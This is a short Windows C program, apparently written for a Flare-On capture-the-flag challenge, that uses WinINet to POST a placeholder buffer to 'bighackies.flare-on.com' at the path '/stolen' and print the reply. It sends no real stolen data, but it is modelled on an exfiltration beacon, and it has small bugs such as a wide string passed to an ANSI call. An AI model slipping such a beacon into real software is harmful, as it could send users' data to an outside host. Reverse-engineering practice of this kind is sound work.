#include <windows.h>
#include <wininet.h>
#include <stdio.h>

void PrintLastError() {
    DWORD errorCode = GetLastError();

    LPVOID errorMsg = NULL;
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        0, // Default language
        (LPWSTR)&errorMsg,
        0,
        NULL
    );

    if (errorMsg != NULL) {
        // Print the error message
        wprintf(L"Error Code %d: %s\n", errorCode, (LPWSTR)errorMsg);

        // Free the allocated buffer
        LocalFree(errorMsg);
    } else {
        // If FormatMessage fails, print a generic error message
        wprintf(L"Error Code %d: Unable to retrieve error message.\n", errorCode);
    }
}

int main() {
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
    BOOL result = FALSE;

    // Initialize WinINet
    hInternet = InternetOpenA(L"bananabot 5000", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("InternetOpenA failed with error %d\n", GetLastError());
        PrintLastError();
        return 1;
    }

    // Open a connection to the server
    LPCSTR host = "bighackies.flare-on.com";
    hConnect = InternetConnectA(hInternet, host, 443, 0, 0, INTERNET_SERVICE_HTTP, 0,0 );
    if (hConnect == NULL) {
        printf("InternetConnectA failed with error %d\n", GetLastError());
        PrintLastError();
        InternetCloseHandle(hInternet);
        return 1;
    }


    hRequest = HttpOpenRequestA(hConnect, "POST", "/stolen", 0,0,0,0x800000,0); // flags na zero i ma dzialac
    if (hRequest == NULL) {
        printf("HttpOpenRequestA failed with error %d\n", GetLastError());
        PrintLastError();
        InternetCloseHandle(hInternet);
        return 1;
    }

    CHAR tosend[4096] = {1,2,3,4,5};
    LPCSTR headers = "Content-Type: application/x-www-form-urlencoded\r\n";
    result = HttpSendRequestA(hRequest, headers, -1, tosend, sizeof(tosend));
    if (!result) {
        printf("HttpSendRequestA failed with error %d\n", GetLastError());
        PrintLastError();
        InternetCloseHandle(hInternet);
        return 1;
    }

    CHAR responseHeaders[4096];
    DWORD responseHeadersSize = sizeof(responseHeaders);
    result = HttpQueryInfoA(hRequest, 0x20000005, responseHeaders, &responseHeadersSize, NULL);
    if (!result) {
        printf("HttpQueryInfoA failed with error %d\n", GetLastError());
        PrintLastError();
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Read and print the response
    CHAR buffer[4096];
    DWORD bytesRead = 0;
    if (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        printf("%.*s", bytesRead, buffer);
    }

    // Clean up
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return 0;
}
